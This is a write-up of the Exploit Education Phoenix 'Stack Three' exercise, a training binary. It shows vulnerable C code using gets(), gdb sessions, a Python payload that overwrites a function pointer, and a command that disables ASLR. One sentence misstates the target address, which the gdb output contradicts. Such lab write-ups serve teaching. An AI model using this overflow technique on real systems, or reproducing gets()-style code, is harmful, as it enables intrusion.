The vulnerable snippet of code :

```C
void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }
```

The goal here is to exploit a buffer overflow due to the use of gets(), to overwrite locals.fp with the pointer to the complete_level() function.

We're going to use gdb to determine the address of the complete_level() function and write our exploit.

# GDB

First running the program and finding out the address of complete_level() :

```bash
$ gdb -q code                          
Reading symbols from code...
(No debugging symbols found in code)
(gdb) break *main
Breakpoint 1 at 0x1196
(gdb) r
Starting program: /home/coucou/Documents/Exploit_Education/Phoenix/03_Stack_Three/code 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555555196 in main ()
(gdb) p complete_level
$1 = {<text variable, no debug info>} 0x555555555179 <complete_level>
```

The complete_level() fucntion is stored at 0x0000555555555196. We can test an exploit :

```bash
(gdb) r <<< $(python3 -c 'print("\x41"*64+"\x79\x51"+"\x55"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/coucou/Documents/Exploit_Education/Phoenix/03_Stack_Three/code <<< $(python3 -c 'print("\x41"*64+"\x79\x51"+"\x55"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555555196 in main ()
(gdb) c
Continuing.
Welcome to Stack Three, brought to you by https://exploit.education
calling function pointer @ 0x555555555179
Congratulations, you've finished Stack Three :-) Well done!
[Inferior 1 (process 10550) exited normally]
```

The exploit is working, let's try it out outside the gdb environment.

# Exploit

```bash
$ python3 -c 'print("\x41"*64+"\x79\x51"+"\x55"*4)' | ./code 
Welcome to Stack Three, brought to you by https://exploit.education
calling function pointer @ 0x555555555179
zsh: done                python3 -c 'print("\x41"*64+"\x79\x51"+"\x55"*4)' | 
zsh: segmentation fault  ./code
```

The program ran into a segmentation fault since the pointer didn't redirect to the complete_level() function. That's because of the ASLR, which is a security feature that randomizes the memory addresses to prevent exploits such as this one. Let's disable it and try again :

```bash
$ setarch "$(uname -m)" -R /bin/bash

$ python3 -c 'print("\x41"*64+"\x79\x51"+"\x55"*4)' | ./code
Welcome to Stack Three, brought to you by https://exploit.education
calling function pointer @ 0x555555555179
Congratulations, you've finished Stack Three :-) Well done!
```
